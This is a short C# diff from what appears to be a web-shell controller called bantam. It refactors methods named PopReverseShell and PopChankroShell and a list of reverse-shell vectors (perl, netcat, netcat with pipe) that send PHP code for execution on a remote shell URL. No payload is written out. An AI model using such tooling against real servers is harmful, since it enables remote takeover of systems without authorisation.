@@ -18,7 +18,7 @@ namespace bantam.Forms
         /// <summary>
         /// 
         /// </summary>
-        public static readonly ReadOnlyCollection<string> shellVectors = new List<string>() {
+        public static readonly ReadOnlyCollection<string> shellVectors = new List<string> {
              "perl",
              "netcat",
              "netcat with pipe",
@@ -188,7 +188,7 @@ namespace bantam.Forms
         /// Normal request routine for popping reverse shell
         /// </summary>
         /// <param name="shellCode"></param>
-        private async void PopReverseShell(string shellCode)
+        private async Task PopReverseShell(string shellCode)
         {
             string phpCode = PhpHelper.ExecuteSystemCode(shellCode, false);
 
@@ -203,7 +203,7 @@ namespace bantam.Forms
         /// 
         /// </summary>
         /// <param name="phpCode"></param>
-        private async void PopChankroShell(string phpCode)
+        private async Task PopChankroShell(string phpCode)
         {
             await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode));
         }
